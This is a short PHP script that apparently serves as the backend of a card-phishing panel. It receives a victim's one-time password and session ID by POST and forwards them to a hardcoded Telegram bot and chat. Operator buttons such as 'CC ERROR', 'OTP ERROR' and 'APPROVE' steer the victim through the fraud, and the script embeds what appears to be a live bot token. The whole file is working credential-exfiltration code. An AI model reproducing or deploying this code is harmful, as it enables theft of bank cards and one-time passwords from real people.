<?php

// Define your bot token
$botToken = "7764284417:AAE9-ADJoUIFoXjNuZclwFI8yJOpKRcINMQ"; // Replace with your bot's API token
$telegramApiUrl = "https://api.telegram.org/bot$botToken";

// Define the chat ID (default chat for sending messages)
$chatId = "1690728339"; // Replace with your chat ID

class SendToTelegram
{
    private $telegramApiUrl;
    private $botToken;

    public function __construct($botToken)
    {
        $this->botToken = $botToken;
        $this->telegramApiUrl = "https://api.telegram.org/bot$botToken";
    }

    // Method to send a message
    public function sendMessage($chatId, $message, $keyboard = null)
    {
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML',
        ];

        if ($keyboard) {
            $data['reply_markup'] = json_encode($keyboard);
        }

        $this->sendRequest("/sendMessage", $data);

        header('Content-Type: application/json');
        return json_encode(['success' => true, 'message' => 'Failed to send message to Telegram.']);
    }


    public function sendRequest($endpoint, $data)
    {
        $url = $this->telegramApiUrl . $endpoint;

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            error_log("CURL error: " . curl_error($ch));
            return false;
        }

        curl_close($ch);
        return $response;
    }
}

// Instantiate the class
$telegram = new SendToTelegram($botToken);

// Handle POST requests for form submissions or webhook updates
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    try {
        $request = json_decode(file_get_contents("php://input"), true);

        if (isset($request['unique_id'])) {
            $uniqueId = htmlspecialchars($request['unique_id']);
            $otp = htmlspecialchars($request['otp']);
            $message = "New Data Received:\n";
            $message .= "OTP: $otp\n";
            $message .= "Unique_ID: $uniqueId\n";

            $keyboard = [
                "inline_keyboard" => [
                    [
                        ["text" => "CC ERROR", "callback_data" => "cc2_" . $uniqueId],
                        ["text" => "OTP", "callback_data" => "otp_" . $uniqueId],
                        ["text" => "OTP ERROR", "callback_data" => "otp2_" . $uniqueId],
                        ["text" => "APPROVE", "callback_data" => "app_" . $uniqueId],
                        ["text" => "APPROVE ERROR", "callback_data" => "app2_" . $uniqueId],
                        ["text" => "DONE", "callback_data" => "done_" . $uniqueId],
                    ],
                ],
            ];

            $response = $telegram->sendMessage($GLOBALS['chatId'], $message, $keyboard);
            echo json_encode(['success' => true, 'response' => $response]);
        } else {
            echo json_encode(['success' => false, 'error' => 'Unique ID missing.']);
        }
    } catch (Exception $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
}
